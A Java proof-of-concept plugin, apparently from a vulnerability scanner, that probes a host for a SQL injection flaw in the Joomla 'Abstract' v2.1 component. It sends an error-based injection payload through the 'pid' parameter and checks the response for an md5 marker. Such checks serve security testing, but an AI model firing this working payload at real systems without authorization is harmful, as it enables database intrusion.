package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpStatus;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;

import cn.com.sgcc.marki_with_maven.misc.NetWorkTools;

public class Joomla_Component_Abstract_v21_SQL_Injection implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "Joomla_Component_Abstract_v21_SQL_Injection");
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/index.php", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			if ( resp.getStatusLine().getStatusCode() == 200 )
			{
				ismatch = true;
			}
			httpGet.releaseConnection();
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		boolean success = false;
		CloseableHttpClient customClient = null;
		try {
			String url = String.format("%s://%s:%s/index.php?option=com_abstract&view=conferences&layout=detail&pid=1+OR+1+GROUP+BY+CONCAT_WS(md5(233),0x3a,0x496873616e53656e63616e,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1", serviceType.contains("https") ? "https":"http", ip, port );
			HttpGet httpGet = new HttpGet(url);
			customClient = new NetWorkTools().getCustomClient();
			CloseableHttpResponse resp = customClient.execute(httpGet);
			String string = EntityUtils.toString(resp.getEntity());
			if ( resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK && string.contains("e165421110ba03099a1c0393373c5b43") )
			{
				success = true;
				return success;
			}
			httpGet.releaseConnection();			
		} catch (KeyManagementException | NoSuchAlgorithmException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		finally
		{
			try {
				if(customClient != null)
					customClient.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		return success;
	}

	
	public static void main(String[] args) {
		// TODO Auto-generated method stub

	}

}
